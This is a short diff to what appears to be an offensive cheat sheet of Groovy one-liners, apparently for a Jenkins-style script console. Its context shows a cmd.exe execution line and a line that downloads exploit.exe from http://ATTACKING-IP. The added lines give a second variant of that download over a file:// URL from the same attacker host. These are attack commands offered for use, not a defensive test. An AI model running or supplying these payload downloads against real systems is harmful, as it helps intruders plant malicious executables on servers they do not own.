@@ -92,4 +92,6 @@ def sout = new StringBuffer(), serr = new StringBuffer();def proc = 'cmd.exe /c 
 
 Remote File Download:
 def url = 'http://ATTACKING-IP/exploit.exe';def file = new File('exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
+(or)
+def url = 'file://ATTACKING-IP//public//exploit.exe';def file = new File('exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
 
